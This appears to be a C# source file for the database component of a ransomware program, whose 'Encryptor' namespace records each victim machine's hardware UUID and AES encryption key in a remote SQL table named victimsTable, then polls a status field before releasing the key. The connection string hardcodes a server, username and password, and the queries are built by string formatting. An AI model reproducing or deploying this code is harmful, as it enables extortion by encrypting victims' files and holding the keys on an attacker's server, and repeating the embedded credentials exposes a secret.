using System;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Security.AccessControl;
using System.Web;
using Decryptor;

namespace Encryptor
{
	public class DB
	{
		// Create a String to hold the database connection string.
		// NOTE: Put in a real database connection string here or runtime won't work
		static string sdwConnectionString =
			@"Data Source = victimssqlserver.database.windows.net; user id=daniel; password=Lifsgledi979; Initial Catalog = Victims;";

		private static string UUID = GetUUID();
		const int KEY_COLUM =1; 

		
		public DB() { }

		public static void addVictimToDB(AesCryptoServiceProvider aes)
		{

			// Create a connection
			SqlConnection DBConnection = new SqlConnection(sdwConnectionString);

			// Open the connection
			DBConnection.Open();

			// Create a String to hold the query.
			string query = String.Format("INSERT INTO victimsTable([UUID], [Key], Status) VALUES ('{0}','{1}',-1);",
				UUID, BitConverter.ToString(aes.Key));

			// Create a SqlCommand object and pass the constructor the connection string and the query string.
			SqlCommand queryCommand = new SqlCommand(query, DBConnection);

			// Use the above SqlCommand object to create a SqlDataReader object.
			SqlDataReader queryCommandReader = queryCommand.ExecuteReader();

			DBConnection.Close();
		}

		public static string getKey()
		{
			// TODO: check the status 
			SqlConnection DBConnection = new SqlConnection(sdwConnectionString);
			DBConnection.Open();
			string query = String.Format("SELECT * FROM victimsTable WHERE UUID='{0}'", UUID);

			SqlCommand queryCommand = new SqlCommand(query, DBConnection);
			SqlDataReader queryCommandReader = queryCommand.ExecuteReader();
			
			
			String rowText = string.Empty;

			if (queryCommandReader.Read())
			{
				rowText = String.Format("{0}",queryCommandReader["Key"]);
			}
			DBConnection.Close();
			return rowText;

		}

		public static int getStatus()
		{
			// TODO: check the status 
			SqlConnection DBConnection = new SqlConnection(sdwConnectionString);
			DBConnection.Open();
			string query = String.Format("SELECT * FROM victimsTable WHERE UUID='{0}'", UUID);

			SqlCommand queryCommand = new SqlCommand(query, DBConnection);
			SqlDataReader queryCommandReader = queryCommand.ExecuteReader();
			
			
			int stautus = -2;

			if (queryCommandReader.Read())
			{
				stautus = (int)(queryCommandReader["Status"]);
			}
			DBConnection.Close();
			return stautus;
		}

		public static void deleteVictimsRow()
		{
			SqlConnection DBConnection = new SqlConnection(sdwConnectionString);
			DBConnection.Open();

			string query = String.Format("DELETE FROM victimsTable WHERE UUID='{0}';",UUID);

			SqlCommand queryCommand = new SqlCommand(query, DBConnection);
			SqlDataReader queryCommandReader = queryCommand.ExecuteReader();

			DBConnection.Close();
		}

		private static string GetLocalIPAddress()
		{
			var host = Dns.GetHostEntry(Dns.GetHostName());
			foreach (var ip in host.AddressList)
			{
				if (ip.AddressFamily == AddressFamily.InterNetwork)
				{
					return ip.ToString();
				}
			}
			throw new Exception("No network adapters with an IPv4 address in the system!");
		}

		private static string GetUUID()
		{
			var procStartInfo = new ProcessStartInfo("cmd", "/c " + "wmic csproduct get UUID")
			{
				RedirectStandardOutput = true,
				UseShellExecute = false,
				CreateNoWindow = true
			};

			var proc = new Process() { StartInfo = procStartInfo };
			proc.Start();

			return proc.StandardOutput.ReadToEnd().Replace("UUID", string.Empty).Trim().ToUpper();
		}
	}   
}